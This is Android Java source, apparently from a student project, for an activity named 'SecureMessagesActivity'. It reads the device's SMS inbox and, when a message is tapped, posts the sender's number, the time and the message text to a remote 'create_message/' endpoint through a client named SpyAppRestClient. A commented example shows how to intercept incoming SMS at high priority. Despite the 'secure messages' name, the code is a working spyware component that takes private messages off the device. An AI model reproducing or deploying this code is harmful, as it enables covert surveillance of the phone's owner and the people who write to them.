package com.example.natalia.super_inzynierka;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;


import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

public class SecureMessagesActivity extends Activity implements OnClickListener, OnItemClickListener
{
    public static final int REQUEST_CODE_FOR_SMS=1;

    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        setTheme( android.R.style.Theme_Light );
        setContentView(R.layout.activity_secure_messages);

        /**
         * You can also register your intent filter here.
         * And here is example how to do this.
         *
         * IntentFilter filter = new IntentFilter( "android.provider.Telephony.SMS_RECEIVED" );
         * filter.setPriority( IntentFilter.SYSTEM_HIGH_PRIORITY );
         * registerReceiver( new SmsReceiver(), filter );
         **/

        this.findViewById( R.id.UpdateList ).setOnClickListener( this );
    }

    private ArrayList<String> smsList = new ArrayList<>();

    public void onItemClick( AdapterView<?> parent, View view, int pos, long id )
    {
        System.out.println("ON ITEM CLICK");
        try
        {
            String[] splitted = smsList.get( pos ).split("\n");
            String sender = splitted[0];
            String time = splitted[1];
            String encryptedData = "";
            for ( int i = 2; i < splitted.length; ++i )
            {
                System.out.println("5");
                encryptedData += splitted[i];
            }
            String data = sender + " : " + time + " : " + encryptedData ;
                    //+ "\n" + StringCryptor.decrypt( new String(SmsReceiver.PASSWORD), encryptedData );
            Toast.makeText( this, data, Toast.LENGTH_SHORT ).show();

            postRequest(sender, time, encryptedData);
        }
        catch (Exception e)
        {
            System.out.println("wyjatek");
            e.printStackTrace();
        }
    }

    public void onClick( View v )
    {
        ContentResolver contentResolver = this.getContentResolver();
        Uri SMS_INBOX = Uri.parse("content://sms/inbox");

        Cursor cursor = contentResolver.query(SMS_INBOX, null, null, null, null);
        int indexBody = cursor.getColumnIndex( SmsReceiver.BODY );
        int indexAddr = cursor.getColumnIndex( SmsReceiver.ADDRESS );
        int indexDate = cursor.getColumnIndex( SmsReceiver.DATE );
        if ( indexBody < 0 || !cursor.moveToFirst() ){ return;}

        smsList.clear();

        do
        {
            String date = cursor.getString(indexDate);
            long d = Long.parseLong(date);

            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(d);

            String min;
            int mYear = calendar.get(Calendar.YEAR);
            int mMonth = calendar.get(Calendar.MONTH);
            int mDay = calendar.get(Calendar.DAY_OF_MONTH);
            int hour = calendar.get(Calendar.HOUR_OF_DAY);
            int minute = calendar.get(Calendar.MINUTE);
            if(minute<10){
                 min = "0" + minute;
            }
            else {
                 min = Integer.toString(minute);
            }
            String time = mDay + "-" + mMonth + "-" + mYear + "  " + hour + ":" + min;

            String str = cursor.getString( indexAddr ) + "\n" + time + "\n" + cursor.getString( indexBody ) ;

            smsList.add( str );
        }
        while( cursor.moveToNext() );


        ListView smsListView = (ListView) findViewById( R.id.SMSList );
        smsListView.setAdapter( new ArrayAdapter<>( this, android.R.layout.simple_list_item_1, smsList) );
        smsListView.setOnItemClickListener( this );
    }

    public void postRequest(String number, String date, String text) {
        RequestParams params = new RequestParams();
        params.put("number", number);
        params.put("start_time", date);
        params.put("text", text);
        SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                System.out.println("success");
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                System.out.println("failure");
            }
        });
    }
}